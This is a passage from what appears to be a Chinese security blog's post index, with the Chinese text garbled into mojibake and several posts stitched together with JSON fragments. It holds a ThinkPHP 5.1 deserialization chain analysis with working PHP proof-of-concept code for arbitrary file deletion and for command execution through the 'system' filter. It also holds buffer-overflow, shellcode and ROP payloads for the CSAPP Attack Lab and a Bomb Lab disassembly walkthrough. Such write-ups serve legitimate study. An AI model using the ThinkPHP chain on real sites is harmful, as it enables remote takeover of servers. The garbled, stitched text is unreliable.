ä¸‹ä¼˜é›…åœ°é…ç½® PHP ä»£ç å®¡è®¡ç¯å¢ƒ æˆ‘ä¸»è¦æ˜¯é…ç½®äº†vscodeçš„ç¯å¢ƒï¼Œphpstormæœ‰ç‚¹éº»çƒ¦ã€‚ åˆ†æåˆ©ç”¨é“¾é¦–å…ˆæˆ‘ä»¬å…¨å±€æœ__destructæ–¹æ³•ï¼Œæ‰¾åˆ°ä¸ªåœ¨Windows.phpé‡Œç„¶åå‘ç°è°ƒç”¨removeFilesæ–¹æ³•ï¼Œè·Ÿè¿›å»çœ‹ private function removeFiles() { foreach ($this-&gt;files as $filename) { if (file_exists($filename)) { @unlink($filename); //æµ‹è¯•åˆ é™¤æ–‡ä»¶ echo &quot;removed&quot;; } } $this-&gt;files = []; } å‘ç°å­˜åœ¨ä¸€ä¸ªä»»æ„æ–‡ä»¶åˆ é™¤çš„æ¼æ´ï¼Œå› ä¸ºbuuçš„ç¯å¢ƒæœ¬èº«å­˜åœ¨ä¸€ä¸ªååºåˆ—åŒ–çš„ç‚¹ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸ç”¨å…ˆå†™ä¸€ä¸ªæ§åˆ¶å™¨ POCå¦‚ä¸‹ &lt;?phpnamespace think\\process\\pipes;class Pipes{}class Windows extends Pipes{ private $files = []; public function __construct() { $this-&gt;files=['/tmp/kk.txt']; }}echo urlencode(serialize(new Windows())); åˆ é™¤æˆåŠŸ æ¥ç€ç»§ç»­çœ‹RCEçš„é“¾å­ï¼Œæ¥ä¸‹æ¥å°±æ˜¯è¦é€šè¿‡file_existså‡½æ•°å»è§¦å‘__toStringï¼Œå› ä¸ºå½“ä¸€ä¸ªå¯¹è±¡è¢«ååºåˆ—åŒ–ååˆè¢«å½“åšå­—ç¬¦ä¸²ä½¿ç”¨æ—¶ä¼šè§¦å‘è¿™ä¸ªæ–¹æ³•ï¼Œè¿™é‡Œæ‰¾åˆ°çš„æ˜¯åœ¨Conversion.phpé‡Œï¼Œç„¶åä¸€ç›´è·Ÿè¿›ï¼Œè·Ÿåˆ°toArray()æ–¹æ³•ï¼Œ public function toArray() { $item = []; $hasVisible = false; foreach ($this-&gt;visible as $key =&gt; $val) { if (is_string($val)) { if (strpos($val, '.')) { list($relation, $name) = explode('.', $val); $this-&gt;visible[$relation][] = $name; } else { $this-&gt;visible[$val] = true; $hasVisible = true; } unset($this-&gt;visible[$key]); } } foreach ($this-&gt;hidden as $key =&gt; $val) { if (is_string($val)) { if (strpos($val, '.')) { list($relation, $name) = explode('.', $val); $this-&gt;hidden[$relation][] = $name; } else { $this-&gt;hidden[$val] = true; } unset($this-&gt;hidden[$key]); } } // åˆå¹¶å…³è”æ•°æ® $data = array_merge($this-&gt;data, $this-&gt;relation); foreach ($data as $key =&gt; $val) { if ($val instanceof Model || $val instanceof ModelCollection) { // å…³è”æ¨¡å‹å¯¹è±¡ if (isset($this-&gt;visible[$key]) &amp;&amp; is_array($this-&gt;visible[$key])) { $val-&gt;visible($this-&gt;visible[$key]); } elseif (isset($this-&gt;hidden[$key]) &amp;&amp; is_array($this-&gt;hidden[$key])) { $val-&gt;hidden($this-&gt;hidden[$key]); } // å…³è”æ¨¡å‹å¯¹è±¡ if (!isset($this-&gt;hidden[$key]) || true !== $this-&gt;hidden[$key]) { $item[$key] = $val-&gt;toArray(); } } elseif (isset($this-&gt;visible[$key])) { $item[$key] = $this-&gt;getAttr($key); } elseif (!isset($this-&gt;hidden[$key]) &amp;&amp; !$hasVisible) { $item[$key] = $this-&gt;getAttr($key); } } // è¿½åŠ å±æ€§ï¼ˆå¿…é¡»å®šä¹‰è·å–å™¨ï¼‰ if (!empty($this-&gt;append)) { foreach ($this-&gt;append as $key =&gt; $name) { if (is_array($name)) { // è¿½åŠ å…³è”å¯¹è±¡å±æ€§ $relation = $this-&gt;getRelation($key); if (!$relation) { $relation = $this-&gt;getAttr($key); if ($relation) { $relation-&gt;visible($name); } } $item[$key] = $relation ? $relation-&gt;append($name)-&gt;toArray() : []; } elseif (strpos($name, '.')) { list($key, $attr) = explode('.', $name); // è¿½åŠ å…³è”å¯¹è±¡å±æ€§ $relation = $this-&gt;getRelation($key); if (!$relation) { $relation = $this-&gt;getAttr($key); if ($relation) { $relation-&gt;visible([$attr]); } } $item[$key] = $relation ? $relation-&gt;append([$attr])-&gt;toArray() : []; } else { $item[$name] = $this-&gt;getAttr($name, $item); } } } return $item; } è¿™ä¸ªæ–¹æ³•æˆ‘ä»¬ä¸»è¦æ˜¯è¦æ‰§è¡Œåˆ°$relation-&gt;visible($name);è¿™å¥ï¼Œå› ä¸ºå½“æˆ‘ä»¬æ§åˆ¶$relationä¸ºç±»å¯¹è±¡ï¼Œå»è°ƒç”¨è¿™ä¸ªä¸å­˜åœ¨çš„visibleæ–¹æ³•ï¼Œå°±ä¼šè§¦å‘__callæ–¹æ³•ï¼Œè€Œå®ƒä¸€èˆ¬åˆä¼šå­˜åœ¨__call_user_funcå’Œ__call_user_func_arrayï¼ŒPHPä»£ç RCEçš„ç‚¹ä¸€èˆ¬ä¹Ÿå°±åœ¨è¿™é‡Œã€‚ ä½†æ˜¯è¦æ‰§è¡Œåˆ°è¿™å¥ï¼Œæˆ‘ä»¬é¦–å…ˆè¦æ»¡è¶³ !empty($this-&gt;append) is_array($name) $relation = $this-&gt;getRelation($key); è¿”å›ç©º $relation = $this-&gt;getAttr($key); ä¸è¿”å›ç©º appendå¯æ§ï¼Œæˆ‘ä»¬ä¼ å€¼ä¸ä¸ºç©ºå°±å¥½ï¼Œä¸»è¦çœ‹åé¢çš„ è·Ÿè¿›getRelationæ–¹æ³• public function getRelation($name = null){ if (is_null($name)) { return $this-&gt;relation; } elseif (array_key_exists($name, $this-&gt;relation)) { return $this-&gt;relation[$name]; } return;} è¿™é‡Œæˆ‘ä»¬æ˜¯ä»toArrayé‡Œä¼ å…¥äº†$keyï¼Œä¸ºäº†ç›´æ¥return;,æˆ‘ä»¬ä¿è¯$keyä¸åœ¨relationæ•°ç»„é‡Œå°±å¥½ æ¥ç€è·Ÿè¿›getAttræ–¹æ³• public function getAttr($name, &amp;$item = null) { try { $notFound = false; $value = $this-&gt;getData($name); } catch (InvalidArgumentException $e) { $notFound = true; $value = null; } ....çœç•¥ return $value; } ä»try/catchä¸­å–å¾—$valueå¹¶ä¸”è¿”å›ï¼Œæ‰€ä»¥æˆ‘ä»¬åˆè¦è·Ÿè¿›getData public function getData($name = null){ if (is_null($name)) { return $this-&gt;data; } elseif (array_key_exists($name, $this-&gt;data)) { return $this-&gt;data[$name]; } elseif (array_key_exists($name, $this-&gt;relation)) { return $this-&gt;relation[$name]; } throw new InvalidArgumentException('property not exists:' . static::class . '-&gt;' . $name);} è¿™ä¸ª$nameå°±æ˜¯ä¹‹å‰$keyï¼Œç„¶ååˆ¤æ–­æ˜¯å¦åœ¨ä»–çš„dataæ•°ç»„å’Œrelationæ•°ç»„ä¸­å†è¿”å›ç»“æœï¼Œè¿™é‡Œæˆ‘ä»¬çš„$this-&gt;dataæ˜¯å¯æ§çš„ï¼Œåœ¨Attributeä¸­ã€‚æ‰€ä»¥æˆ‘ä»¬æœ€ç»ˆ$relation=$this-&gt;data[$key] å½“$relationä¸ºä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œå°±å¯ä»¥è¿›è¡Œè°ƒç”¨ç±»ä¸­çš„ visibleæ–¹æ³•ä¸”ä¼ å‚å¯æ§ï¼Œè¿™é‡Œè¿˜æœ‰ä¸ªçŸ¥è¯†ç‚¹å°±æ˜¯useå…³é”®å­—å»ç»§æ‰¿ç±» æ‰€ä»¥æˆ‘ä»¬æ‰¾åˆ°Model.phpåŒæ—¶ç»§æ‰¿å¦‚ä¸Šä¸¤ä¸ªç±»ï¼Œä½†æ˜¯ä»–æ˜¯ä¸ªæŠ½è±¡ç±»ï¼Œæ‰€ä»¥åˆæ‰¾åˆ°ä»–çš„å­ç±»Pivot æ¥ä¸‹æ¥çš„ç›®æ ‡å°±æ˜¯æ‰¾ä¸€ä¸ªä»£ç æ‰§è¡Œçš„ç‚¹ï¼Œæœ‰__callæ–¹æ³•ï¼Œä½†æ˜¯ä¸å­˜åœ¨visibleæ–¹æ³•ã€‚ Request.phpä¸­ public function __call($method, $args) { if (array_key_exists($method, $this-&gt;hook)) { array_unshift($args, $this); return call_user_func_array($this-&gt;hook[$method], $args); } throw new Exception('method not exists:' . static::class . '-&gt;' . $method); } è¿™ä¸ªhookæ˜¯å¯æ§çš„ï¼Œä½†æ˜¯é‚£ä¸ªargsç»è¿‡äº†array_unshiftå¯¼è‡´æˆ‘ä»¬è¿™ä¸ªä¸å¯æ§ï¼Œä½†æ˜¯call_user_func_array(array(ä»»æ„ç±»,ä»»æ„æ–¹æ³•),$args) ï¼Œæˆ‘ä»¬å¯ä»¥è°ƒç”¨ä»»æ„æ–¹æ³•ï¼Œå¹¶ä¸”å†å»æ‰¾ä¸€ä¸ªæ–¹æ³•ä¸å—è¿™ä¸ªå‚æ•°çš„å½±å“ äº†è§£è¿‡ThinkPHP å†å² RCE æ¼æ´çš„äººå¯èƒ½çŸ¥é“ï¼Œ think\\Request ç±»çš„ input æ–¹æ³•ç»å¸¸æ˜¯ï¼Œç›¸å½“äº call_user_func($filter,$data) ã€‚ä½†æ˜¯å‰é¢ï¼Œ $args æ•°ç»„å˜é‡çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œæ˜¯ä¸€ä¸ªå›ºå®šæ­»çš„ç±»å¯¹è±¡ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬ä¸èƒ½ç›´æ¥è°ƒç”¨ input æ–¹æ³•ï¼Œè€Œåº”è¯¥å¯»æ‰¾è°ƒç”¨ input çš„æ–¹æ³•ã€‚ æˆ‘ä»¬æ‰¾åˆ°inputæ–¹æ³• public function input($data = [], $name = '', $default = null, $filter = '') { if (false === $name) { // è·å–åŸå§‹æ•°æ® return $data; } $name = (string) $name; if ('' != $name) { // è§£æname if (strpos($name, '/')) { list($name, $type) = explode('/', $name); } $data = $this-&gt;getData($data, $name); if (is_null($data)) { return $default; } if (is_object($data)) { return $data; } } // è§£æè¿‡æ»¤å™¨ $filter = $this-&gt;getFilter($filter, $default); if (is_array($data)) { array_walk_recursive($data, [$this, 'filterValue'], $filter); if (version_compare(PHP_VERSION, '7.1.0', '&lt;')) { // æ¢å¤PHPç‰ˆæœ¬ä½äº 7.1 æ—¶ array_walk_recursive ä¸­æ¶ˆè€—çš„å†…éƒ¨æŒ‡é’ˆ $this-&gt;arrayReset($data); } } else { $this-&gt;filterValue($data, $name, $filter); } if (isset($type) &amp;&amp; $data !== $default) { // å¼ºåˆ¶ç±»å‹è½¬æ¢ $this-&gt;typeCast($data, $type); } return $data; } å…¶ä¸­æœ‰ä¸€ä¸ªfilterValue private function filterValue(&amp;$value, $key, $filters) { $default = array_pop($filters); foreach ($filters as $filter) { if (is_callable($filter)) { // è°ƒç”¨å‡½æ•°æˆ–è€…æ–¹æ³•è¿‡æ»¤ $value = call_user_func($filter, $value); } elseif (is_scalar($value)) { if (false !== strpos($filter, '/')) { // æ­£åˆ™è¿‡æ»¤ if (!preg_match($filter, $value)) { // åŒ¹é…ä¸æˆåŠŸè¿”å›é»˜è®¤å€¼ $value = $default; break; } } elseif (!empty($filter)) { // filterå‡½æ•°ä¸å­˜åœ¨æ—¶, åˆ™ä½¿ç”¨filter_varè¿›è¡Œè¿‡æ»¤ // filterä¸ºéæ•´å½¢å€¼æ—¶, è°ƒç”¨filter_idå–å¾—è¿‡æ»¤id $value = filter_var($value, is_int($filter) ? $filter : filter_id($filter)); if (false === $value) { $value = $default; break; } } } } return $value; } æˆ‘ä»¬å¯ä»¥å‘ç°$value = call_user_func($filter, $value);ï¼Œè¿™é‡Œçš„$valueæ˜¯ä¸å¯æ§çš„ï¼Œè¿™ä¸ªæ˜¯inputçš„$dataä¼ å…¥çš„ï¼Œç„¶åæˆ‘ä»¬æ‰¾åˆ°paramï¼Œå‘ç°å®ƒåœ¨æœ€åè°ƒç”¨input public function param($name = '', $default = null, $filter = ''){ if (!$this-&gt;mergeParam) { $method = $this-&gt;method(true); // è‡ªåŠ¨è·å–è¯·æ±‚å˜é‡ switch ($method) { case 'POST': $vars = $this-&gt;post(false); break; case 'PUT': case 'DELETE': case 'PATCH': $vars = $this-&gt;put(false); break; default: $vars = []; } // å½“å‰è¯·æ±‚å‚æ•°å’ŒURLåœ°å€ä¸­çš„å‚æ•°åˆå¹¶ $this-&gt;param = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false)); $this-&gt;mergeParam = true; } if (true === $name) { // è·å–åŒ…å«æ–‡ä»¶ä¸Šä¼ ä¿¡æ¯çš„æ•°ç»„ $file = $this-&gt;file(); $data = is_array($file) ? array_merge($this-&gt;param, $file) : $this-&gt;param; return $this-&gt;input($data, '', $default, $filter); } return $this-&gt;input($this-&gt;param, $name, $default, $filter);} paramå¯ä»¥é€šè¿‡GETæ–¹æ³•ä¼ å…¥ï¼Œä½†æ˜¯$nameæ˜¯ä¼ å…¥çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ç»§ç»­æ‰¾ï¼Œå‘ç°isAjax public function isAjax($ajax = false) { $value = $this-&gt;server('HTTP_X_REQUESTED_WITH'); $result = 'xmlhttprequest' == strtolower($value) ? true : false; if (true === $ajax) { return $result; } $result = $this-&gt;param($this-&gt;config['var_ajax']) ? true : $result; $this-&gt;mergeParam = false; return $result; } è¿™é‡ŒæŠŠ$this-&gt;config['var_ajax']ä¼ å…¥paramçš„$name æ¥ç€æˆ‘ä»¬å›å¤´çœ‹call_user_func($filter, $value);ï¼Œfilterä¼ å…¥systemï¼Œvalueä¼ å…¥å‘½ä»¤ï¼Œfilteræ˜¯filtersæ•°ç»„é‡Œçš„ï¼Œvalueæ˜¯åœ¨inputä¼ å…¥çš„ï¼Œç„¶åæˆ‘ä»¬åœ¨inputä¸­è°ƒç”¨filterValueçš„array_walk_recursive($data, [$this, 'filterValue'], $filter);,è¿™é‡Œè°ƒç”¨filterValueï¼Œä½œç”¨åœ¨$dataï¼Œç„¶å$filteræ˜¯ä¼ å…¥filterValueæ–¹æ³•é‡Œçš„ç¬¬ä¸‰ä¸ªå‚æ•°filtersï¼Œä»–æ˜¯é€šè¿‡getFilterè·å– protected function getFilter($filter, $default) { if (is_null($filter)) { $filter = []; } else { $filter = $filter ?: $this-&gt;filter; if (is_string($filter) &amp;&amp; false === strpos($filter, '/')) { $filter = explode(',', $filter); } else { $filter = (array) $filter; } } $filter[] = $default; return $filter; } æ³¨æ„çœ‹$filter = $filter ?: $this-&gt;filter;ï¼Œå¯æ§ åœ¨inputä¸­$data = $this-&gt;getData($data, $name); protected function getData(array $data, $name) { foreach (explode('.', $name) as $val) { if (isset($data[$val])) { $data = $data[$val]; } else { return; } } return $data; } æ‰€ä»¥$data = $data[$name]ï¼Œå®ƒå°±æ˜¯getå’Œpostçš„æ‰€æœ‰å‚æ•° æœ€åçœ‹æˆ‘ä»¬RCEçš„åœ°æ–¹ private function filterValue(&amp;$value, $key, $filters) { $default = array_pop($filters); foreach ($filters as $filter) { if (is_callable($filter)) { // è°ƒç”¨å‡½æ•°æˆ–è€…æ–¹æ³•è¿‡æ»¤ $value = call_user_func($filter, $value); ....çœç•¥ valueå°±æ˜¯é€šè¿‡GETè¯·æ±‚å¾—åˆ°çš„input.dataå€¼ keyå°±æ˜¯GETçš„é”® filterå°±æ˜¯input.filter POC&lt;?php namespace think\\process\\pipes; use think\\model\\Pivot; class Windows{ private $files = []; public function __construct(){ $this-&gt;files=[new Pivot()]; } } namespace think; abstract class Model{ protected $append=[]; private $data=[]; public function __construct(){ $this-&gt;append=[&quot;qqw&quot;=&gt;['lnk']]; $this-&gt;data=[&quot;qqw&quot;=&gt;new Request()]; } } namespace think; class Request{ protected $hook = []; protected $filter; protected $config; public function __construct() { $this-&gt;hook['visible'] = [$this, 'isAjax']; $this-&gt;filter = &quot;system&quot;; } } namespace think\\model; use think\\Model; class Pivot extends Model{ } use think\\process\\pipes\\Windows; echo urlencode(serialize(new Windows())); $this-&gt;append=[&quot;qqw&quot;=&gt;['lnk']];æ»¡è¶³appendä¸ä¸ºç©ºï¼Œä¸”é”®åœ¨dataæ•°ç»„ä¸­ $this-&gt;data=[&quot;qqw&quot;=&gt;new Request()];è¿”å›Request()å¯¹è±¡ $this-&gt;hook['visible'] = [$this, 'isAjax'];ä¸ºäº†åœ¨__callæ–¹æ³•ä¸­è°ƒç”¨isAjax $this-&gt;filter = &quot;system&quot;;åˆ™æ˜¯è¦æ‰§è¡Œçš„å‡½æ•° å‚è€ƒhttps://ch1e.cn/2022/05/28/tp51/#%E5%89%8D%E8%A8%80 https://zeo.cool/2019/12/18/Thinkphp%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90pop%E5%88%A9%E7%94%A8%E9%93%BE/","link":"/2022/09/12/TP51/"},{"title":"CSAPPä¹‹Attack LAB","text":"æ¥ç€Boom labï¼ŒåŒæ ·æ˜¯ç¬¬ä¸‰ç« é‡Œçš„ï¼ˆè™½ç„¶æˆ‘ä¹¦æ²¡å’‹çœ‹ level1void test() { int val; val = getbuf(); printf(&quot;No exploit. Getbuf returned 0x%x\\n&quot;, val); } ç”±getbufå‡½æ•°è¾“å…¥ï¼Œgdbè°ƒä¸€ä¸‹çœ‹ä¸‹bufè·ç¦»rbpæœ‰0x28ä¸ªå­—èŠ‚ï¼Œç›´æ¥å¡«å……è¿”å›åˆ°touch1åœ°å€å°±è¡Œ exp touch1 = 0x04017c0payload1 = b'a' * 0x28 + p64(touch1)io.sendline(payload1) level2level2å¤šäº†ä¸€ä¸ªåˆ¤æ–­ï¼Œåˆ¤æ–­ä¼ å…¥çš„å‚æ•°å’Œæ–‡ä»¶æ‰€ç»™çš„cookieå€¼æ˜¯å¦ç›¸åŒï¼Œä½†è¿™é‡Œæˆ‘ä»¬æ— æ³•ç›´æ¥ä¼ å‚è¿›touch2å‡½æ•°ï¼Œä¸è¿‡æˆ‘ä»¬è°ƒè¯•å¯ä»¥çŸ¥é“ï¼Œ0x55586000-0x55686000è¿™ä¸€æ®µæ˜¯æœ‰rwxæƒé™çš„ï¼Œå°±å¯ä»¥æ‰§è¡Œshellcode. é€šè¿‡æ±‡ç¼–å¯ä»¥çœ‹åˆ°åœ¨getbufå‡½æ•°æ‰§è¡Œmov rdi, rspæ­¤æ—¶rdi=rspï¼Œä½œä¸ºGets()çš„å‚æ•°bufï¼Œæ„æ€å°±æ˜¯è¾“å…¥å­—ç¬¦ä¸²çš„èµ·å§‹åœ°å€å°±æ˜¯ä¸‹å›¾rspçš„åœ°å€0x5561dc78,åˆšå¥½ä¹Ÿå¤„åœ¨ä¸Šé¢é‚£ä¸€æ®µä¸­ exp touch2 = 0x04017ecstack = 0x5561dc78payload2 = asm('mov rdi, 0x59b997fa;ret')payload2 = payload2.ljust(0x28, b'\\x00')payload2 += p64(stack) + p64(touch2)io.sendline(payload2) level3æ–‡ä»¶ç»™äº†æç¤ºï¼Œä¼ å­—ç¬¦ä¸²çš„åœ°å€ï¼Œäºæ˜¯å…ˆæŠŠå­—ç¬¦ä¸²æ”¾å‰é¢ï¼Œåé¢æ¥åœ°å€ exp touch3 = 0x4018fastack = 0x5561dc78payload3 = b'59b997fa' + asm('mov rdi, 0x5561dc78;ret')payload3 = payload3.ljust(0x28, b'\\x00')payload3 += p64(stack+0x8) + p64(touch3) level4ç®€å•çš„ROPï¼Œæ‰¾ä¸ªpop rdiå°±è¡Œ exp pop_rdi_ret = 0x000000000040141bcookie = 0x59b997fatouch2 = 0x4017ecpayload4 = b'a' * 0x28 + p64(pop_rdi_ret) + p64(cookie) + p64(touch2)io.sendline(payload4) level5Todoâ€¦","link":"/2022/02/10/attack/"},{"title":"CSAPPä¹‹Bomb LAB","text":"Bomb LAB phase_1ç›´æ¥IDAæˆ–è€…gdbæ–­ç‚¹è¿›å»çœ‹åˆ°ä¸€ä¸ªæ¯”è¾ƒå‡½æ•°ï¼Œå­—ç¬¦ä¸²ä¸ºBorder relations with Canada have never been better.ç›´æ¥è¾“å…¥è¿‡ç¬¬ä¸€å…³ phase_2å› ä¸ºæ˜¯å­¦ä¹ ï¼Œå°½é‡ä¸ç”¨IDAçš„F5ï¼Œé”»ç‚¼çœ‹æ±‡ç¼–çš„èƒ½åŠ›ï¼Œç”¨gdbæŸ¥çœ‹ç‚¸å¼¹å‡½æ•°çš„æ±‡ç¼–ä»£ç  0x0000000000400efc &lt;+0&gt;: push rbp0x0000000000400efd &lt;+1&gt;: push rbx0x0000000000400efe &lt;+2&gt;: sub rsp,0x280x0000000000400f02 &lt;+6&gt;: mov rsi,rsp0x0000000000400f05 &lt;+9&gt;: call 0x40145c &lt;read_six_numbers&gt; #è¦ä¼ 6ä¸ªå‚æ•°ï¼Œå¦åˆ™bomb0x0000000000400f0a &lt;+14&gt;: cmp DWORD PTR [rsp],0x1 #ç¬¬ä¸€ä¸ªå‚æ•°ä¸€å®šè¦æ˜¯10x0000000000400f0e &lt;+18&gt;: je 0x400f30 &lt;phase_2+52&gt;0x0000000000400f10 &lt;+20&gt;: call 0x40143a &lt;explode_bomb&gt;0x0000000000400f15 &lt;+25&gt;: jmp 0x400f30 &lt;phase_2+52&gt;0x0000000000400f17 &lt;+27&gt;: mov eax,DWORD PTR [rbx-0x4]0x0000000000400f1a &lt;+30&gt;: add eax,eax0x0000000000400f1c &lt;+32&gt;: cmp DWORD PTR [rbx],eax0x0000000000400f1e &lt;+34&gt;: je 0x400f25 &lt;phase_2+41&gt;0x0000000000400f20 &lt;+36&gt;: call 0x40143a &lt;explode_bomb&gt;0x0000000000400f25 &lt;+41&gt;: add rbx,0x40x0000000000400f29 &lt;+45&gt;: cmp rbx,rbp0x0000000000400f2c &lt;+48&gt;: jne 0x400f17 &lt;phase_2+27&gt;0x0000000000400f2e &lt;+50&gt;: jmp 0x400f3c &lt;phase_2+64&gt;0x0000000000400f30 &lt;+52&gt;: lea rbx,[rsp+0x4]0x0000000000400f35 &lt;+57&gt;: lea rbp,[rsp+0x18]0x0000000000400f3a &lt;+62&gt;: jmp 0x400f17 &lt;phase_2+27&gt;0x0000000000400f3c &lt;+64&gt;: add rsp,0x280x0000000000400f40 &lt;+68&gt;: pop rbx0x0000000000400f41 &lt;+69&gt;: pop rbp0x0000000000400f42 &lt;+70&gt;: ret ä¼ å…¥å‚æ•°é€šè¿‡rbxæ¥å¯»å€ï¼Œé€»è¾‘æ˜¯ä¸€ä¸ªç®€å•çš„é¦–é¡¹ä¸º1ï¼Œå…¬æ¯”ä¸º2çš„ç­‰æ¯”æ•°åˆ—ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¼ å…¥çš„åº”è¯¥ä¸º1 2 4 8 16 32 çœ‹åˆ°+57å¤„æœ‰ä¸ªlea rbp,[rsp+0x18]ï¼Œè¿™é‡Œæ˜¯ç›¸å½“äºè®¾ç½®ä¸€ä¸ªæ¯”è¾ƒå€¼ï¼Œåˆ¤æ–­æ˜¯å¦å¾ªç¯æœ‰6æ¬¡äº†ï¼Œå› ä¸º 0x18 = 2424 / 4 = 6 å› ä¸ºæ¯æ¬¡å†™ä¸‹ä¸€é¢˜éƒ½è¦å…ˆè¿‡ä¸Šä¸€é¢˜ï¼Œæ‰€ä»¥è¿™é‡Œå»ºè®®å°†ç­”æ¡ˆå†™åœ¨ä¸€ä¸ªæ–‡ä»¶é‡Œï¼Œæ–¹ä¾¿ä¸‹æ–­ç‚¹è°ƒè¯•ï¼Œåœ¨gdbé‡Œå°±å¯ä»¥ç›´æ¥ ä¾‹å¦‚ b *(0x0x0000000000400f5b) r exp.txt phase_3å…ˆçœ‹æ±‡ç¼– 0x0000000000400f43 &lt;+0&gt;: sub rsp,0x180x0000000000400f47 &lt;+4&gt;: lea rcx,[rsp+0xc]0x0000000000400f4c &lt;+9&gt;: lea rdx,[rsp+0x8]0x0000000000400f51 &lt;+14&gt;: mov esi,0x4025cf/*x/s 0x4025cf0x4025cf: &quot;%d %d&quot;è¯»å…¥ä¸¤ä¸ªå‚æ•°*/0x0000000000400f56 &lt;+19&gt;: mov eax,0x00x0000000000400f5b &lt;+24&gt;: call 0x400bf0 &lt;__isoc99_sscanf@plt&gt; #è¿”å›å€¼è¦å¤§äº10x0000000000400f60 &lt;+29&gt;: cmp eax,0x10x0000000000400f63 &lt;+32&gt;: jg 0x400f6a &lt;phase_3+39&gt;0x0000000000400f65 &lt;+34&gt;: call 0x40143a &lt;explode_bomb&gt;0x0000000000400f6a &lt;+39&gt;: cmp DWORD PTR [rsp+0x8],0x7 #ç¬¬ä¸€ä¸ªå‚æ•°å€¼ä¸èƒ½å¤§äº7ï¼Œ å¦åˆ™bomb0x0000000000400f6f &lt;+44&gt;: ja 0x400fad &lt;phase_3+106&gt;0x0000000000400f71 &lt;+46&gt;: mov eax,DWORD PTR [rsp+0x8]0x0000000000400f75 &lt;+50&gt;: jmp QWORD PTR [rax*8+0x402470]0x0000000000400f7c &lt;+57&gt;: mov eax,0xcf0x0000000000400f81 &lt;+62&gt;: jmp 0x400fbe &lt;phase_3+123&gt;0x0000000000400f83 &lt;+64&gt;: mov eax,0x2c30x0000000000400f88 &lt;+69&gt;: jmp 0x400fbe &lt;phase_3+123&gt;0x0000000000400f8a &lt;+71&gt;: mov eax,0x1000x0000000000400f8f &lt;+76&gt;: jmp 0x400fbe &lt;phase_3+123&gt;0x0000000000400f91 &lt;+78&gt;: mov eax,0x1850x0000000000400f96 &lt;+83&gt;: jmp 0x400fbe &lt;phase_3+123&gt;0x0000000000400f98 &lt;+85&gt;: mov eax,0xce0x0000000000400f9d &lt;+90&gt;: jmp 0x400fbe &lt;phase_3+123&gt;0x0000000000400f9f &lt;+92&gt;: mov eax,0x2aa0x0000000000400fa4 &lt;+97&gt;: jmp 0x400fbe &lt;phase_3+123&gt;0x0000000000400fa6 &lt;+99&gt;: mov eax,0x1470x0000000000400fab &lt;+104&gt;: jmp 0x400fbe &lt;phase_3+123&gt;0x0000000000400fad &lt;+106&gt;: call 0x40143a &lt;explode_bomb&gt;0x0000000000400fb2 &lt;+111&gt;: mov eax,0x00x0000000000400fb7 &lt;+116&gt;: jmp 0x400fbe &lt;phase_3+123&gt;0x0000000000400fb9 &lt;+118&gt;: mov eax,0x1370x0000000000400fbe &lt;+123&gt;: cmp eax,DWORD PTR [rsp+0xc]0x0000000000400fc2 &lt;+127&gt;: je 0x400fc9 &lt;phase_3+134&gt;0x0000000000400fc4 &lt;+129&gt;: call 0x40143a &lt;explode_bomb&gt;0x0000000000400fc9 &lt;+134&gt;: add rsp,0x180x0000000000400fcd &lt;+138&gt;: ret ç†Ÿæ‚‰çš„å¸ˆå‚…å¯ä»¥çœ‹åˆ°0x0000000000400f75 &lt;+50&gt;: jmp QWORD PTR [rax*8+0x402470]è¿™æ˜¯ä¸€ä¸ªå…¸å‹switchè¯­å¥å®ç°ï¼Œå¹¶ä¸”æœ‰ä¸€ä¸²çš„mov jmpï¼Œä¹Ÿå¯ç”¨IDAåæ±‡ç¼–çœ‹çœ‹ä¼ªCä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œæ‰€æœ‰åˆ†æ”¯éƒ½ä¼šè·³åˆ°0x0000000000400fb9çš„ä½ç½®ï¼Œæ¯”è¾ƒeax å’Œ æˆ‘ä»¬è¾“å…¥çš„ç¬¬äºŒä¸ªå‚æ•° æ‰€ä»¥è¿™é‡Œæˆ‘è¾“å…¥ 1 311 phase_4è¿™é‡Œæœ‰ä¸¤ä¸ªå‡½æ•°ï¼Œé¦–å…ˆçœ‹ç‚¸å¼¹ 0x000000000040100c &lt;+0&gt;: sub rsp,0x180x0000000000401010 &lt;+4&gt;: lea rcx,[rsp+0xc] #å‚æ•°20x0000000000401015 &lt;+9&gt;: lea rdx,[rsp+0x8] #å‚æ•°10x000000000040101a &lt;+14&gt;: mov esi,0x4025cf # %d %d0x000000000040101f &lt;+19&gt;: mov eax,0x0 #eax = 00x0000000000401024 &lt;+24&gt;: call 0x400bf0 &lt;__isoc99_sscanf@plt&gt;0x0000000000401029 &lt;+29&gt;: cmp eax,0x2 #ä¸¤ä¸ªæ•°å­—ï¼Œå¦åˆ™bomb0x000000000040102c &lt;+32&gt;: jne 0x401035 &lt;phase_4+41&gt;0x000000000040102e &lt;+34&gt;: cmp DWORD PTR [rsp+0x8],0xe # 1å‚ &lt;= 0xe0x0000000000401033 &lt;+39&gt;: jbe 0x40103a &lt;phase_4+46&gt;0x0000000000401035 &lt;+41&gt;: call 0x40143a &lt;explode_bomb&gt;0x000000000040103a &lt;+46&gt;: mov edx,0xe #edx = 0xe0x000000000040103f &lt;+51&gt;: mov esi,0x0 #esi = 00x0000000000401044 &lt;+56&gt;: mov edi,DWORD PTR [rsp+0x8] #edi = 1å‚æ•°0x0000000000401048 &lt;+60&gt;: call 0x400fce &lt;func4&gt;0x000000000040104d &lt;+65&gt;: test eax,eax #æµ‹è¯•eaxæ˜¯å¦ä¸ºç©ºï¼Œæ˜¯ç©ºåˆ™è·³è½¬ï¼Œbomb0x000000000040104f &lt;+67&gt;: jne 0x401058 &lt;phase_4+76&gt; 0x0000000000401051 &lt;+69&gt;: cmp DWORD PTR [rsp+0xc],0x0 #2å‚ä¸º0ï¼Œåˆ™è·³è½¬0x0000000000401056 &lt;+74&gt;: je 0x40105d &lt;phase_4+81&gt;0x0000000000401058 &lt;+76&gt;: call 0x40143a &lt;explode_bomb&gt;0x000000000040105d &lt;+81&gt;: add rsp,0x180x0000000000401061 &lt;+85&gt;: ret 